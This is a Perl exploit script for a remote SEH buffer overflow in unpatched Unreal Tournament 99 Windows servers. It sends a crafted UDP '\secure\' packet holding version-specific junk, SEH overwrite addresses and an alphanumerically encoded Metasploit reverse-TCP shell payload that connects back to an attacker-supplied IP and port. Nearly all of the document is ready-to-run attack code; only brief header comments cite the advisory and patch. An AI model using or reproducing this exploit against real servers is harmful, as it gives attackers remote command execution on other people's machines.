# Unreal Tournament Remote Buffer Overflow Exploit (SEH) (Windows)
# Discovered by:  Luigi Auriemma (http://aluigi.altervista.org/adv/unsecure-adv.txt)
# Coded By: Fulcrum (08/02/2011)
#
# Patch: http://www.unrealadmin.org/forums/showthread.php?t=15616
# Vulnerable: all ut99 servers without a patch.
# Tested on: win7 64-bit, xp sp3, vista sp2 with ut v400,436,440,451,451b
#
# Bad characters: 0x00 0x5c
# Maximum shellcode size: 938 bytes
#
# Thanks to: Metasploit, Heretic, Luigi Auriemma, Peter Van Eeckhoutte & Skylined
use IO::Socket::INET;

# Header
die "Usage: unreal_tournament-bof-win.pl <host> <query port> <reverse ip> <reverse port>\n" unless ($ARGV[3]);

# Connect to the server
$socket = new IO::Socket::INET(PeerAddr => $ARGV[0],PeerPort => $ARGV[1], Proto => "udp", Timeout => 2) or die;

# Convert the reverse ip and port to hex format
$reverse_ip_hex = join("", unpack("H*", pack("c*", split(/\./, $ARGV[2]))));
$reverse_port_hex = unpack("H*", pack("N", $ARGV[3]));

# Get the server version
$socket->send("\\basic\\");
$socket->recv($recvmsg, 512, 0);

# Create the special packet
$packet = "\\secure\\"; # header
if ($recvmsg =~ /gamever\\(400|436)/) {
	$packet .= "\x41" x 24; # junk for ut v400,436
} else {
	$packet .= "\x41" x 64; # junk for ut v440,451,451b
}
$packet .= "\xeb\x06\x90\x90"; # nseh / short jump to the shellcode
if ($recvmsg =~ /gamever\\440/) {
	$packet .= "\x61\xae\x14\x10"; # seh / 0x1014AE61 / pop ebx - pop - ret / core.dll v440
} else {
	$packet .= "\x98\x53\x13\x10"; # seh / 0x10135398 / pop esi - pop - retbis / core.dll v400,436,451,451b
}
$packet .= "\x90"; # nop
$packet .=
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff".
"IIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI"; # alphanumeric decoder from Skylined (getEIP code taken from Heretic)
$packet .= shellcode_encoder(
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52".
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26".
"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d".
"\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0".
"\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b".
"\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff".
"\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d".
"\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b".
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44".
"\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b".
"\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f".
"\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29".
"\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50".
"\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7\x68".
chr(hex(substr($reverse_ip_hex, 0, 2))). # 1st byte of the ip in hex
chr(hex(substr($reverse_ip_hex, 2, 2))). # 2nd byte of the ip in hex
chr(hex(substr($reverse_ip_hex, 4, 2))). # 3rd byte of the ip in hex
chr(hex(substr($reverse_ip_hex, 6, 2))). # 4th byte of the ip in hex
"\x68\x02\x00".
chr(hex(substr($reverse_port_hex, 4, 2))). # 1st byte of the port in hex
chr(hex(substr($reverse_port_hex, 6, 2))). # 2nd byte of the port in hex
"\x89\xe6\x6a\x10\x56".
"\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d\x64\x00\x89".
"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7".
"\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50".
"\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f".
"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d".
"\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff".
"\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72".
"\x6f\x6a\x00\x53\xff\xd5"); # reverse tcp shellcode / ruby msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 P

# Send the special packet
$socket->send($packet);

# Close the connection to the server
$socket->close();

exit;

# Alphanumeric encoder function from Skylined (Alpha2)
sub shellcode_encoder {
	local $valid_chars, $shellcoded_encoded, $a, $b, $c, $d, $e, $f, $i, $j;
	$valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	$shellcoded_encoded = "";
	for($i=0; $i<length($_[0]); $i++) {
		$char = hex(unpack("H*", substr($_[0], $i, 1)));
		$a = ($char & 0xf0) >> 4;
		$b = ($char & 0x0f);
		$f = $b;
		$j = int(rand(length($valid_chars)));
		while((hex(unpack("H*", substr($valid_chars, $j, 1))) & 0x0f) != $f) { $j = ++$j % length($valid_chars); }
		$e = hex(unpack("H*", substr($valid_chars, $j, 1))) >> 4;
		$d = ($a^$e);
		$j = int(rand(length($valid_chars)));
		while((hex(unpack("H*", substr($valid_chars, $j, 1))) & 0x0f) != $d) { $j = ++$j % length($valid_chars); }
		$c = hex(unpack("H*", substr($valid_chars, $j, 1))) >> 4;
		$shellcoded_encoded .= chr(($c<<4)+$d);
		$shellcoded_encoded .= chr(($e<<4)+$f);
	}
	$shellcoded_encoded .= "\x41";
	return $shellcoded_encoded;
}